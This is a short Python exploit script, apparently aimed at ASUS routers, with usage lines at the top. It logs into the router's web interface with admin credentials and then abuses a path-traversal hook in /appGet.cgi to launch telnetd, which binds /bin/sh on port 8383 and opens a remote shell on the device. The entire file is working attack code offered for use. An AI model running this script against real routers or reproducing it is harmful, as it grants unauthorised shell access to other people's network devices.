# Usage:
# ./asus_exploit.py <target host> <target port> <admin username> <admin password>
# ./asus_exploit.py 192.168.1.1 80 admin password

import requests
import base64
import sys

(host, port) = (sys.argv[1], sys.argv[2])
url = ('http://%s:%s' % (host, port)) if port != '80' else 'http://%s' % host
username = sys.argv[3]
password = sys.argv[4]
credentials = username + ':' + password
credentials = credentials.encode()

s = requests.Session()

s.post(url + '/login.cgi',
    headers={'Referer': url + '/Main_Login.asp'},
    data={'login_authorization': base64.b64encode(credentials)})

response = s.get(url + '/appGet.cgi?hook=load_script("../usr/sbin/telnetd+-l+/bin/sh+-p+8383")')